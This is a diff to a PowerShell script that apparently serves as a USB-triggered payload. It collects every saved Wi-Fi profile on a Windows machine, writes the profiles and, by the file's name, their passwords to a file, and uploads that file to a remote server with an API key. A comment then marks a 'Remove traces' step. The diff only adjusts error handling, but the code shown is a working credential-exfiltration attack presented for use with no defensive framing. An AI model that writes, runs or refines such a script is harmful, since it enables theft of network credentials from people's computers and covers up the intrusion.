@@ -13,11 +13,15 @@ if ([console]::CapsLock -eq $true) {
 }
 
 # Add all network profiles
-$Profiles = @()
-$Profiles += (netsh wlan show profiles | Select-String "\:(.+)$").Matches | ForEach-Object { 
-    if ($_.Groups[1]) {
-        $_.Groups[1].Value.Trim()
+try {
+    $Profiles = @()
+    $Profiles += (netsh wlan show profiles | Select-String "\:(.+)$").Matches | ForEach-Object { 
+        if ($_.Groups[1]) {
+            $_.Groups[1].Value.Trim()
+        }
     }
+} catch {
+    Write-Host "Profile retrieval failed: $($_.Exception.Message)"
 }
 
 # Result string
@@ -38,10 +42,6 @@ $Res = $Profiles | ForEach-Object {
 $Res | Format-Table -AutoSize | Out-File -FilePath .\$PASSFILE -Encoding ASCII -Width 50
 
 # Send file to server
-# Check if file exists
-if (Test-Path $PASSFILE) {
-    Write-Host "File exists: $PASSFILE"
-
 $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
 
 $body = @"
@@ -53,13 +53,10 @@ $(Get-Content -Path $PASSFILE -Raw)
 --$boundary--
 "@
 
-    try {
-        Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
-    } catch {
-        Write-Host "File upload failed: $($_.Exception.Message)"
-    }
-} else {
-    Write-Host "The file does not exist: $PASSFILE"
+try {
+    Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+} catch {
+    Write-Host "File upload failed: $($_.Exception.Message)"
 }
 
 # Remove traces
